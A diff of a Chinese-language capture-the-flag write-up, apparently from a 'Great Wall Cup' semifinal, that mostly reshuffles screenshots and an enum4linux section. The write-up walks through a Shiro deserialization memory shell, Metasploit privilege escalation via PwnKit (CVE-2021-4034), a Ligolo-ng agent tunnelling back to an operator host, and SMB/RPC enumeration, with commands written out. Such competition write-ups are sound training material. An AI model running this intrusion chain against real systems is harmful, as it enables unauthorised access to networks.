@@ -16,11 +16,11 @@ media_subpath: /assets/image/great-wall-cup-semifinal/
 
 使用 `fscan` 对目标进行端口扫描，发现目标使用了 **Apache Shiro** 框架，并成功获取到 Shiro 的初始密钥（Default Key）。
 
-![fscan扫描结果](image_1.png)
-
 ### 漏洞利用
 
 利用 Shiro 反序列化漏洞，使用工具注入内存马（Memory Shell），然后通过 **Godzilla（哥斯拉）** 连接内存马，成功获取第一个 flag。
+
+![爆破成功截图](image_5.png)
 
 ---
 
@@ -39,11 +39,13 @@ run post/multi/manage/autoroute  # 添加路由
 run post/multi/recon/local_exploit_suggester  # 自动检测 Linux 可利用提权漏洞
 ```
 
-![MSF提权](image_2.png)
+![内网SMB扫描](image_4.png)
 
 ### 本地提权（PwnKit）
 
 利用 **CVE-2021-4034（PwnKit）** 本地提权漏洞实现权限提升：
+
+![Ligolo-ng配置](image_3.png)
 
 ```bash
 use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
@@ -79,7 +81,7 @@ chmod +x agent
 ./agent -connect 10.11.114.51:11601 -ignore-cert
 ```
 
-在 MSF 中执行 `sessions 1 start` 启动监听会话。
+![MSF提权](image_2.png)
 
 ### 创建虚拟网卡并配置路由
 
@@ -91,8 +93,6 @@ ip link set ligolo up
 # 添加路由（目标内网网段 10.10.10.0/24）
 ip route add 10.10.10.0/24 dev ligolo
 ```
-
-![Ligolo-ng配置](image_3.png)
 
 ### MSF 内网扫描
 
@@ -128,8 +128,6 @@ PORT    STATE SERVICE     VERSION
 
 目标运行 **Samba 4 + SMBv2.1**。
 
-![内网SMB扫描](image_4.png)
-
 ### SMB 枚举与爆破
 
 使用 `fscan` 进一步扫描确认：
@@ -154,12 +152,6 @@ start vulscan
 
 **Samba 4.23.4** 为较旧版本，尝试 SMBSQL 利用失败后，空会话访问被拒绝。
 
-使用 **enum4linux** 进行 SMB 枚举：
-
-```bash
-enum4linux -a 192.168.45.100
-```
-
 ### 使用 rpcclient 获取域信息
 
 ```bash
@@ -181,13 +173,19 @@ user:[flag] rid:[0x450]
 
 ### 爆破获取 Flag
 
+使用 **enum4linux** 进行 SMB 枚举：
+
+```bash
+enum4linux -a 192.168.45.100
+```
+
+![enum4linux扫描结果](image_1.png)
+
 通过枚举和爆破最终获取 flag：
 
 ```
 flag{a9f6bba6e4d62a9a4a5a0694141ebe79}
 ```
-
-![爆破成功截图](image_5.png)
 
 ---
 
@@ -201,7 +199,7 @@ flag{a9f6bba6e4d62a9a4a5a0694141ebe79}
 
 ## 总结
 
-本次比赛中湖北队解出 3 个 Flag 即在 ISW 赛道排名前五。主要技术点包括：
+本次比赛中湖北省解出 3 个 Flag 即在 ISW 赛道排名前五。主要技术点包括：
 
 | 阶段 | 技术 |
 |------|------|
@@ -210,3 +208,5 @@ flag{a9f6bba6e4d62a9a4a5a0694141ebe79}
 | 横向移动 | Ligolo-ng 代理隧道 |
 | 内网扫描 | MSF + fscan + nmap |
 | 服务利用 | SMB/RPC 枚举 + 信息收集 |
+
+感觉大家的内网渗透都没有系统的学习过。
